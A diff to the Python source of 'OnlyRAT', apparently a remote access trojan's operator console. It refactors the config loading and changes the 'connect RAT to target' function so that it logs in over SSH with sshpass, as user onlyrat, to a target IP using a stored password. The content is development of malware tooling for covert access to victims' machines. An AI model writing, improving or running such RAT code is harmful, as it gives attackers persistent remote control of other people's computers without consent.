@@ -42,29 +42,33 @@ options_menu = """
 
 username = getpass.getuser()
 header = f"{username}@onlyrat $ "
-IPADDRESS = "IPADDRESS"
-PASSWORD = "PASSWORD"
-WORKINGDIR = "WORKINGDIR"
+IP_KEY = "IPADDRESS"
+PASS_KEY = "PASSWORD"
+WORKINGDIR_KEY = "WORKINGDIR"
 
 def read_config(config_file):
     if not os.path.exists(config_file):
         print(f"Error: Config file '{config_file}' does not exist.")
-        sys.exit(1)
+        return {}
     configuration = {}
     read_lines = open(config_file, "r").readlines()
-    configuration[IPADDRESS] = read_lines[0].strip()
-    configuration[PASSWORD] = read_lines[1].strip()
-    configuration[WORKINGDIR] = read_lines[2].strip()
+    configuration[IP_KEY] = read_lines[0].strip()
+    configuration[PASS_KEY] = read_lines[1].strip()
+    configuration[WORKINGDIR_KEY] = read_lines[2].strip()
     return configuration
 
 # connect RAT to target
 def connect():
     if sys.argv[1] == "-f":
         configuration = read_config(sys.argv[2])
-        ipv4 = configuration.get(IPADDRESS)
-        password = configuration.get(PASSWORD)
-        wd = configuration.get(WORKINGDIR)
-        os.system(f"ssh -p {password} onlyrat@{ipv4}")
+        if not configuration:
+            print(help_menu)
+            return
+        tgt_ipv4 = configuration.get(IP_KEY)
+        tgt_pword = configuration.get(PASS_KEY)
+        tgt_wd = configuration.get(WORKINGDIR_KEY)
+        # remotely connect
+        os.system(f"sshpass -p \"{tgt_pword}\" ssh onlyrat@{tgt_ipv4}")
 
 
 def os_detection():
